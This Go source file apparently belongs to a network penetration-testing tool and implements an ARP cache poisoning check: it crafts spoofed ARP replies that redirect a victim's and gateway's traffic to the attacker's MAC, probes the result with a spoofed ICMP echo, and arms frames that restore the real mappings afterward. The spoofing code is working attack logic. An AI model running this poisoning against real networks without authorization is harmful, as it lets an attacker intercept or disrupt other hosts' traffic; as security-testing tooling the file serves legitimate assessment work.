// arpspoof.go implements the ARP cache poisoning check. Impact temporary,
// restore active, affects clients: the two unicast replies put the attack
// leg's MAC into the victim's and the gateway's caches for each other's
// address, and the two armed repair replies put the real MACs back when
// the run ends. The behavior changes no host forwarding, so nothing is
// relayed while the caches are poisoned.

package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type arpSpoofFinding struct {
	Action  string   `json:"action"`
	Targets []string `json:"targets"`
	Gateway string   `json:"gateway"`
	Restore string   `json:"restore"`
}

// RunARPSpoof sends ARP replies for the target's victim and gateway pair
// after arming the two neighbor repairs on the runner's teardown handle,
// then probes the victim's cache with an ICMP echo request sent to the
// victim's MAC from the gateway's IPv4. The predicate is the reply's
// Ethernet destination: an echo reply from the victim's MAC addressed to
// the attack leg's MAC confirms that the victim sends its gateway traffic
// to the attacker, a reply to another MAC or an ARP request from the
// victim for the gateway's address resists, and silence within the window
// is pending. Craft and send failures include operation context.
func RunARPSpoof(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldGateway, check.FieldGatewayMAC); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	victimMAC, victimIP := deps.Target.Victim.MAC, deps.Target.Victim.IP
	gwMAC, gwIP := deps.Target.Gateway.MAC, deps.Target.Gateway.IP

	// Arm the teardown steps before the first frame so an interrupted
	// run still restores. The order of Arm calls is the execution order.
	victimRepair, err := craftARPRestore(src, victimMAC, victimIP, gwIP, gwMAC)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft victim repair")
	}
	gwRepair, err := craftARPRestore(src, gwMAC, gwIP, victimIP, victimMAC)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft gateway repair")
	}
	deps.Teardown.Arm("neighbor-unicast-repair-victim", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, victimRepair)
	})
	deps.Teardown.Arm("neighbor-unicast-repair-gateway", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, gwRepair)
	})

	// Send poison frames: victim→gw (attacker claims to be gw),
	// gw→victim (attacker claims to be victim).
	victimPoison, err := craftARPSpoof(src, victimMAC, victimIP, gwIP)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft victim poison")
	}
	gwPoison, err := craftARPSpoof(src, gwMAC, gwIP, victimIP)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft gateway poison")
	}

	if err := deps.AttackLeg.Send(ctx, victimPoison); err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: send victim poison")
	}
	if err := deps.AttackLeg.Send(ctx, gwPoison); err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: send gateway poison")
	}

	detail, _ := json.Marshal(arpSpoofFinding{
		Action:  "arp-poison",
		Targets: []string{victimIP.String()},
		Gateway: gwIP.String(),
		Restore: "neighbor-unicast-repairs",
	})
	deps.Emitter.Finding("arp", detail)

	v, err := observeCacheProbe(ctx, deps, cacheProbe{
		peer:     deps.Target.Victim,
		peerName: "victim",
		spoofed:  gwIP,
	}, "the victim sent its gateway traffic to the attack leg")
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof")
	}
	return v, nil
}

// craftARPSpoof builds a unicast ARP reply: "spoofedIP is-at attackerMAC".
func craftARPSpoof(src, dstMAC net.HardwareAddr, dstIP, spoofedIP net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   src,
		SourceProtAddress: spoofedIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craft.Default(eth, arp)
}

// craftARPRestore builds a unicast ARP reply restoring the real MAC mapping.
func craftARPRestore(src, dstMAC net.HardwareAddr, dstIP, srcIP net.IP, realMAC net.HardwareAddr) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   realMAC,
		SourceProtAddress: srcIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craft.Default(eth, arp)
}
